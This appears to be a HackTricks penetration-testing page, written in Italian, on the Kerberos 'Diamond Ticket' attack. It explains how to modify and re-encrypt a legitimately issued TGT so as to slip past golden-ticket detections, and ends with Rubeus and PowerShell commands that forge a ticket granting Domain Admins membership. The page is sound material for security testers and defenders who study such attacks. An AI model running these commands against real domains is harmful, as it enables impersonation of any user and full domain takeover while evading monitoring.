# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Come un biglietto d'oro**, un biglietto di diamante è un TGT che può essere utilizzato per **accedere a qualsiasi servizio come qualsiasi utente**. Un biglietto d'oro è completamente falsificato offline, crittografato con l'hash krbtgt di quel dominio, e poi passato in una sessione di accesso per l'uso. Poiché i controller di dominio non tracciano i TGT che (o essi) hanno legittimamente emesso, accetteranno felicemente i TGT crittografati con il proprio hash krbtgt.

Ci sono due tecniche comuni per rilevare l'uso di biglietti d'oro:

- Cerca TGS-REQ che non hanno un corrispondente AS-REQ.
- Cerca TGT che hanno valori ridicoli, come la durata predefinita di 10 anni di Mimikatz.

Un **biglietto di diamante** è creato **modificando i campi di un legittimo TGT emesso da un DC**. Questo si ottiene **richiedendo** un **TGT**, **decrittografandolo** con l'hash krbtgt del dominio, **modificando** i campi desiderati del biglietto, e poi **ri-cifrando**. Questo **supera i due difetti sopra menzionati** di un biglietto d'oro perché:

- I TGS-REQ avranno un AS-REQ precedente.
- Il TGT è stato emesso da un DC, il che significa che avrà tutti i dettagli corretti dalla politica Kerberos del dominio. Anche se questi possono essere accuratamente falsificati in un biglietto d'oro, è più complesso e soggetto a errori.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
